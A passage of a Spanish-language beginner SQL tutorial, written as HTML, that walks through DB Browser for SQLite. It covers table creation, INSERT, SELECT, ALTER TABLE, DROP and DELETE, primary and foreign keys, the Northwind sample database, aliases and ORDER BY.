&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues iremos al siguente enlace y descargemos &lt;code&gt;DB Browser for SQLite - Standard installer&lt;/code&gt;, dependiendo la version de windows que utilizamos &lt;code&gt;32 o 64 bits&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://sqlitebrowser.org/dl/&quot;&gt;https://sqlitebrowser.org/dl/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finalmente solo debemos seguir los pasos simples de instalación:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y ya tendriamos &lt;code&gt;sqlite&lt;/code&gt; listo para usarlo, damos click en el &lt;code&gt;dbBrowser&lt;/code&gt; y se nos abrira la ventana donde vamos a trabajar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;crear-base-de-datos&quot;&gt;CREAR BASE DE DATOS - CREATE DATABASE &lt;a href=&quot;#crear-base-de-datos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para comenzar a crear nuestra primera base de datos en &lt;code&gt;sqlite&lt;/code&gt;, podemos hacerlo de dos maneras:&lt;/p&gt;

&lt;p&gt;La primera seria simplemente ejecutar la palabra reservada &lt;code&gt;CREATE DATABASE&lt;/code&gt; y seguidamente el nombre que queremos que tenga nuestra base de datos, en este caso &lt;code&gt;Alumnos&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;CREATE DATABASE Alumnos;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero para reprensentarlo de una manera mas visible podemos hacerlo ejecutando en la opcion &lt;code&gt;New Database&lt;/code&gt; y le asignamos un nombre, en este caso valga la redundancia &lt;code&gt;Alumnos.db&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al darle en &lt;code&gt;Gudardar&lt;/code&gt;, automaticamente se nos abrira otra ventana, donde nos pide ingresar un campo de nombre &lt;code&gt;Table&lt;/code&gt;, para ello tenemos que primer tener en cuenta el concepto de &lt;code&gt;tabla&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;crear-tabla&quot;&gt;CREAR TABLA - CREATE TABLE &lt;a href=&quot;#crear-tabla&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es una estructura de datos que se almancenan en &lt;code&gt;filas y columnas&lt;/code&gt; y estas obviamente deben de tener un nombre.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder crearlas debemos ejecutar la siguente consulta:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;CREATE TABLE &quot;Alumnos&quot; (

);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;campos&quot;&gt;CAMPOS &lt;a href=&quot;#campos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Las tablas a su vez tienen &lt;code&gt;campos&lt;/code&gt;, los cuales corresponden a los nombres de las columnas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;registros&quot;&gt;REGISTROS &lt;a href=&quot;#registros&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ademas de contener &lt;code&gt;campos&lt;/code&gt;, tambien contienen &lt;code&gt;registros&lt;/code&gt; que vendrian a ser cada una de las filas de las tablas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;valor-de-campo&quot;&gt;VALOR DE CAMPO &lt;a href=&quot;#valor-de-campo&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vendria a ser cada uno de los valores de la interseccion entre los &lt;code&gt;campos&lt;/code&gt; y los &lt;code&gt;registros&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;columnas&quot;&gt;COLUMNAS &lt;a href=&quot;#columnas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Anteriormente realizamos la creación de una tabla, pero esta no nos serviria sin antes crear los campos o nombres de las columnas, para ello debemos crear los campos que necesitemos segun el tipo de dato que sera almacenado.&lt;/p&gt;

&lt;p&gt;Si lo hacemos de manera grafica debemos seleccionar la opcion &lt;code&gt;Add&lt;/code&gt; y en &lt;code&gt;Name&lt;/code&gt; le indicaremos el nombre que tendra nuestro campo, seguidamente en &lt;code&gt;Type&lt;/code&gt; debemos indicar el tipo de dato el cual sera almacenado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En &lt;code&gt;sqlite&lt;/code&gt; existen 5 tipos de datos que podemos usar, estos se corresponden a:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;INTEGER:&lt;/code&gt; Almacenan valores de tipos de datos enteros.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;TEXT:&lt;/code&gt; Almancenan valores de cadenas de texto.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;BLOB:&lt;/code&gt; Almacena datos binarios, como fotos, videos entre otros.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;REAL:&lt;/code&gt; Almacena numeros flotantes o valores con &lt;code&gt;,&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;NUMERIC:&lt;/code&gt; Almacena numeros que necesitan un calculo matematico preciso, no tienen limites a diferencia que real.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En base a lo previamente mencionado crearemos 3 campos en nuestra tabla, que correspondera a el &lt;code&gt;Nombre , Apellido y la edad&lt;/code&gt;. Haciendolo de manera grafica con el gestor solo tendriamos que agregar mas campos con &lt;code&gt;add&lt;/code&gt; y si nos percatamos en la parte de abajo se nos muestra el codigo que deberiamos ejecutar si queremos ejecutar para hacer el mismo proceso mediante una &lt;code&gt;consulta&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Con esto ya tendriamos una base de datos creada con nuestra tabla &lt;code&gt;Alumnos&lt;/code&gt;, lo siguiente seria insertar registros en nuestra tabla, ya que por el momento esta se encuentra vacia.&lt;/p&gt;

&lt;h2 id=&quot;insertar-valores-en-tabla-insert-into&quot;&gt;INSERTAR VALORES EN TABLA - INSERT INTO &lt;a href=&quot;#insertar-valores-en-tabla-insert-into&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder insertar valores nos vamos al apartado de &lt;code&gt;Execute SQL&lt;/code&gt;. Una vez ahi para añadir valores dentro de nuestra tabla debemos hacer uso de la palabra reservada &lt;code&gt;INSERT INTO&lt;/code&gt;, y especificar el nombre de la tabla en este caso &lt;code&gt;Alumnos&lt;/code&gt; , abrimos &lt;code&gt;()&lt;/code&gt; y digitamos el nombre de los campos , seguidamente usamos la palabra &lt;code&gt;VALUES&lt;/code&gt; y de igual manera en &lt;code&gt;()&lt;/code&gt; los valores que queremos insertar.&lt;/p&gt;

&lt;p&gt;Ahora para correr nuestra &lt;code&gt;query&lt;/code&gt; solo debemos darle click a el boton &lt;code&gt;run&lt;/code&gt; o presionar la combinacion de teclas &lt;code&gt;CTRL + ENTER&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En la parte de abajo se nos mostrara un mensaje comunicandonos que la consulta se ejecuto sin errores.&lt;/p&gt;

&lt;h2 id=&quot;consultas-o-querys&quot;&gt;CONSULTAS O QUERYS &lt;a href=&quot;#consultas-o-querys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una consulta o query son las solicitudes o operaciones que realizamos a una base de datos. Basicamente las consultas se usan para realizar la operaciones basicas &lt;code&gt;CRUD&lt;/code&gt;, las cuales son el acronimo de:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/crud.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instruccion-select&quot;&gt;INSTRUCCION SELECT &lt;a href=&quot;#instruccion-select&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La consulta &lt;code&gt;SELECT&lt;/code&gt;, nos devuelve un conjunto de resultados de registros de una o varias tablas. Podemos seleccionar todos los campos haciendo uso de &lt;code&gt;*&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podemos seleccionar un campo o mas especificos separandolos por comas &lt;code&gt;,&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado nos arroja una tabla nueva con los registros que filtramos.&lt;/p&gt;

&lt;h2 id=&quot;modificar-tabla-alter-table&quot;&gt;MODIFICAR TABLA - ALTER TABLE &lt;a href=&quot;#modificar-tabla-alter-table&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Esta instrucción nos permite modificar la estructura existente de una tabla de nuestra base de datos, en otras palabras a que despues de haberla creado podemos hacer modificaciones en ella como cambiarle el nombre, agregar, renombrar o quitar columnas y cambiar el tipo de datos.&lt;/p&gt;

&lt;h2 id=&quot;renombrar-tabla&quot;&gt;RENOMBRAR TABLA &lt;a href=&quot;#renombrar-tabla&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si queremos renombrar el nombre de nuestra tabla, debemos usar la instrucción &lt;code&gt;ALTER TABLE&lt;/code&gt; mas el nombre de la tabla actual y seguidamente &lt;code&gt;RENAME TO&lt;/code&gt; mas el nombre al cual deseamos cambiar.&lt;/p&gt;

&lt;p&gt;En este caso aplicaremos el proceso a nuestra tabla &lt;code&gt;Alumnos&lt;/code&gt; para renombrarla como &lt;code&gt;Estudiantes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y de esta manera vemos que se efectua correctamente y ahora si queremos seleccionar los datos de nuestra tabla, debemos hacerlos con el nuevo nombre que ahora corresponde a &lt;code&gt;Estudiantes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;renombrar-columna&quot;&gt;RENOMBRAR COLUMNA &lt;a href=&quot;#renombrar-columna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;De la misma manera que renombramos la tabla, tambien podemos hacer el proceso similar para renombrar una columna, para ello debemos ejecutar igualmente la sentencia &lt;code&gt;ALTER TABLE&lt;/code&gt; mas la tabla que contenga a la columna, despues &lt;code&gt;RENAME COLUMN&lt;/code&gt; mas el nombre actual de la columna y finalmente con &lt;code&gt;TO&lt;/code&gt; le especificamos el nombre al cual lo vamos a cambiar.&lt;/p&gt;

&lt;p&gt;Vamos a verlo de manera practica aplicandolo a la columna &lt;code&gt;edad&lt;/code&gt; de nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; y la renombraremos como &lt;code&gt;Edades&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora volvemos a seleccionar la consulta y vemos que renombramos la columna exitosamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;agregar-columna&quot;&gt;AGREGAR COLUMNA &lt;a href=&quot;#agregar-columna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora supongamos queremos agregar una nueva columna a nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; que corresponda con el nombre de &lt;code&gt;Profesion&lt;/code&gt;, pues esto lo hariamos de manera similiar usando de nueva cuenta &lt;code&gt;ALTER TABLE&lt;/code&gt; mas el nombre de nuestra tabla, despues usaremos la palabra reservad &lt;code&gt;ADD&lt;/code&gt; y seguidamente el nombre que tendra nuestra columna en conjunto con su tipo de dato.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si visualizamos nuevamente nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; observamos que ahora se añadio la columna &lt;code&gt;Profesion&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;eliminar-columna&quot;&gt;ELIMINAR COLUMNA &lt;a href=&quot;#eliminar-columna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para pode eliminar una columna, si supongamos esta no corresponde o cometimos un error al crearla es bastante similar a la creacion de una, solo que en este caso debemos nuevamente usar la sentencia &lt;code&gt;ALTER TABLE&lt;/code&gt; con el nombre de la tabla y despues &lt;code&gt;DROP COLUMN&lt;/code&gt; mas el nombre del campo a eliminar.&lt;/p&gt;

&lt;p&gt;Vamos a aplicarlo para borrar el campo previamente creado que fue &lt;code&gt;Profesion&lt;/code&gt;, ejecutamos la consulta de manera exitosa.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nuevamente vemos nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt;, ahora el campo &lt;code&gt;profesion&lt;/code&gt; fue eliminado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instruccion-drop&quot;&gt;INSTRUCCION DROP &lt;a href=&quot;#instruccion-drop&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Esta sentencia probablemente solo la utilizaremos cuando estemos en la fase de construcción de nuestra base de datos, ya que en esta etapa haciendo los cambios pertinentes hasta que este lista, de otro modo si la ejecutariamos en produccion los resultados serian desastrozos y posiblemente irreparables si no contamos con una copia de seguridad.&lt;/p&gt;

&lt;h2 id=&quot;eliminar-base-de-datos-drop-database&quot;&gt;ELIMINAR BASE DE DATOS - DROP DATABASE &lt;a href=&quot;#eliminar-base-de-datos-drop-database&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para eliminar una base de datos solo debemos de ejecutar &lt;code&gt;DROP DATABASE&lt;/code&gt; y seguidamente el nombre de la base de datos, sin embargo esta instrucción no se puede ejecutar en &lt;code&gt;sqlite3&lt;/code&gt; asi que tenemos que hacerlo manualmente, pero otros gestores si permiten esta opción asi es que es bueno saberlo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;eliminar-tabla-drop-table&quot;&gt;ELIMINAR TABLA - DROP TABLE &lt;a href=&quot;#eliminar-tabla-drop-table&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder eliminar una tabla debemos de ejecutar la instrucción &lt;code&gt;DROP TABLE&lt;/code&gt; y seguidamente el nombre de la tabla a eliminar.&lt;/p&gt;

&lt;p&gt;Vamos a crearnos para el proceso una tabla de nombre prueba, que contenga los campos &lt;code&gt;nombre&lt;/code&gt; y &lt;code&gt;edad&lt;/code&gt; con datos cualquiera.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora en esa tabla ejecutaremos la instrucción y vemos que la tabla se elimina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;pero aqui hay algo que quisiera agregar, cuando ejecutamos nuevamente el comando este nos devuelve un error en vista que ya no existe la tabla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder solucionar eso cuando se realize una creación de tabla o eliminación usar la palabra reservada &lt;code&gt;IF EXISTS&lt;/code&gt; y  de esa manera comprueba la existencia de la tabla antes de borrarla y en consecuencia evitamos los errores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;identificadores&quot;&gt;IDENTIFICADORES &lt;a href=&quot;#identificadores&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Cuando estamos insertando registros, debemos de poder usar un metodo que nos permita diferenciar los registros de tal modo que cada uno de estos sea unico. Aqui es donde comenzamos a usar los &lt;code&gt;identificadores&lt;/code&gt; los cuales son de dos tipos: &lt;code&gt;claves primarias y claves foraneas&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;claves-primarias-o-primary-keys&quot;&gt;CLAVES PRIMARIAS - PRIMARY KEYS &lt;a href=&quot;#claves-primarias-o-primary-keys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Cada tabla debe de tener su identificador unico, que no se puede repetir para poder diferencias los registros, esto se conoce como &lt;code&gt;clave primary&lt;/code&gt;, la cual no puede ser nula y es autoincrementable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si queremos definir una clave primaria en nuestra tabla anteriormente creada, primero tendriamos que eliminar todos los registros, de otro modo no podremos hacerlo. Por ello siempre al momento de crear una tabla es necesario definir nuestra &lt;code&gt;clave primaria&lt;/code&gt; y evitar problemas.&lt;/p&gt;

&lt;p&gt;En nuestro caso vamos a eliminar los registros para seguir trabajando con muestra tabla &lt;code&gt;Àlumnos&lt;/code&gt; y esto lo hacemos con otra consulta la cual es &lt;code&gt;DELETE&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;identificadores&quot;&gt;INSTRUCCION DELETE &lt;a href=&quot;#identificadores&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para borrar los registros debemos usar la palabra reservada &lt;code&gt;DELETE FROM&lt;/code&gt; y a continuación el nombre de la tabla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si queremos hacerlo de manera grafica, nos vamos a la opción &lt;code&gt;Database Structure&lt;/code&gt;, buscamos la tabla y le damos en modificar.&lt;/p&gt;

&lt;p&gt;Se nos volvera a abrir nuevamente la misma pestaña de cuando creamos la tabla, pero ahora modificaremos los valores y añadiremos un campo &lt;code&gt;id_alumno&lt;/code&gt; y seleccionaremos las opciones de &lt;code&gt;PK&lt;/code&gt; clave primary - auto-incrementable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podriamos hacerlo desde el apartado de &lt;code&gt;Execute Sql&lt;/code&gt; insertando la siguiente consulta que nos marca el propio gestor.&lt;/p&gt;

&lt;p&gt;Una vez modificada la tabla, probamos a insertar nuevamente varios registros con &lt;code&gt;INSERT INTO&lt;/code&gt; que lo vimos previamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No es necesario que especifiquemos el campo &lt;code&gt;id_alumno&lt;/code&gt;, puesto que es &lt;code&gt;auto-incrementable&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Debemos tener en cuenta que si ejecutamos varias consultas, entonces tenemos que separarlas con &lt;code&gt;;&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ahora verificamos los registros insetados haciendo uso del &lt;code&gt;SELECT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si vemos esta vez el &lt;code&gt;id_alumno&lt;/code&gt; nos muestra el numero de identificador distinto el cual hace que los registros que ahora tenemos sean unicos.&lt;/p&gt;

&lt;h2 id=&quot;claves-foraneas-o-foreign-keys&quot;&gt;CLAVES FORANEAS - FOREIGN KEYS &lt;a href=&quot;#claves-foraneas-o-foreign-keys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para entender lo que es una clave foranea, primero vammos a crear una neuva tabla y la llamaremos &lt;code&gt;turno_clase&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como ya vimos anteriormente cada tabla tiene su clave primaria, pero esta vez vemos que en la tabla &lt;code&gt;turno_clase&lt;/code&gt; existe un campo &lt;code&gt;id_alumno&lt;/code&gt; que no esta haciendo referencia a una clave primaria ya que esta se repite. Entonces te preguntaras a que hace referencia entonces ese campo?&lt;/p&gt;

&lt;p&gt;Pues ese campo se llama &lt;code&gt;clave foranea&lt;/code&gt; ya que se utiliza para hacer referencia a una &lt;code&gt;clave primaria&lt;/code&gt; de otra tabla, en este caso a la clave de la tabla &lt;code&gt;alumnos&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ya que la tabla &lt;code&gt;turno_clase&lt;/code&gt; necesita hacer referencia a los &lt;code&gt;alumnos&lt;/code&gt; mediante el valor unico que tienen correspondiente al &lt;code&gt;id_alumno&lt;/code&gt; y con ese identificador podemos tener acceso a toda la información de los alumnos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En este punto para poder continuar aprendiendo todas los tipos de consultas que nos falta es necesario que tengamos una &lt;code&gt;Base de Datos&lt;/code&gt; de mayor escala y asi entender todo de manera mas clara, para ello vamos a descargarnos una de las tipicas bases de datos que se usan a la hora de aprender &lt;code&gt;Sql&lt;/code&gt;. En este caso vamos a utilizar la base de datos de &lt;code&gt;Northwind.db&lt;/code&gt; del siguiente enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikiversity.org/wiki/Database_Examples/Northwind/SQLite&quot;&gt;https://en.wikiversity.org/wiki/Database_Examples/Northwind/SQLite&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez vayamos a este enlace lo unico que tenemos que hacer es copiar toda la consulta entera y pegarla en el apartado de &lt;code&gt;Execute SQL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora nos dirigimos al apartado de &lt;code&gt;Database Structure&lt;/code&gt; podemos visualizar la DB &lt;code&gt;Northwind.db&lt;/code&gt;, y ahora estamos listos para continuar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;clausula-as-o-alias&quot;&gt;CLAUSULA AS O ALIAS &lt;a href=&quot;#clausula-as-o-alias&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Anteriormente vimos que podiamos seleccionar registro de las tablas usando &lt;code&gt;SELECT&lt;/code&gt;, en este caso al ahora trabajar con &lt;code&gt;northwind&lt;/code&gt; podemos probar a seleccionar alguna de las tablas como &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero hay ocasiones como esta en las que nos resulte tedioso trabajar con tablas las cuales no creamos previamente nosotros y para poder entenderlas mejor queramos cambiar el nombre de los campos de estas por algo mas descriptivo para nostros, es posible esto?.&lt;/p&gt;

&lt;p&gt;Pues la respuesta es si y eso lo hacemos con la palabra reservada &lt;code&gt;AS&lt;/code&gt; despues de seleccionar los campos deseados y especificamos el nombre al que queremos renombrar para que se muestren en los registros, no debemos olvidar que con &lt;code&gt;FROM&lt;/code&gt; especificamos de que tabla queremos hacer la consulta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podriamos usar el mismo concepto para en la tabla &lt;code&gt;Products&lt;/code&gt;, supongamos que en nuestra empresa un dia especifico se dan los productos a mitad de precio, nosotros podriamos mostrar el precio normal y tambien otro campo donde nos muestre el precio a la mitad. Ya que al &lt;code&gt;precio&lt;/code&gt; ser un valor numerico podemos hacer operaciones como multiplicarlo, dividirlo y entre otras operaciones matematicas comunes como a continuación.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;clausula-order-by&quot;&gt;CLAUSULA ORDER BY &lt;a href=&quot;#clausula-order-by&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Imaginemos una situación en la que tenemos una tabla, en este caso especifico la tabla &lt;code&gt;Products&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora en la empresa en la que trabajamos, nos piden ordenar la tabla pero no queremos que se ordene por defecto con el &lt;code&gt;product_id&lt;/code&gt;, mas bien queremos ordenarlo por el &lt;code&gt;precio&lt;/code&gt;.Pues en este caso utilizariamos &lt;code&gt;ORDER BY&lt;/code&gt; y seguidamente el campo por el cual queremos ordenarla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De este modo lo que haria la consulta seria ordenar la tabla en base a la columna de los &lt;code&gt;Precios&lt;/code&gt;, pero vemos que nos los ordenar de menor a mayor y nosotros queremos que se ordenen los precios de mayor a menor ya que nos importan los prodcutos que cuestan mas.&lt;/p&gt;

&lt;p&gt;Pues en ese caso usuariamos &lt;code&gt;DESC&lt;/code&gt; al final para poder ordenarlo en modo &lt;code&gt;DESCENDENTE&lt;/code&gt; y de igual forma podriamos usar tambien &lt;code&gt;ASC&lt;/code&gt; que nos lo ordenaria de manera &lt;code&gt;ASCENDENTE&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entonces te preguntaras genial, me ordenar segun el precio ya que es un valor numerico, pero que pasa si en vez de ese campo, lo ordeno por &lt;code&gt;ProductName&lt;/code&gt;?. En ese caso tambien nos lo va ordenar pero al ser tipo de dato &lt;code&gt;TEXT&lt;/code&gt; lo hara alfabeticamente.&lt;/p&gt;

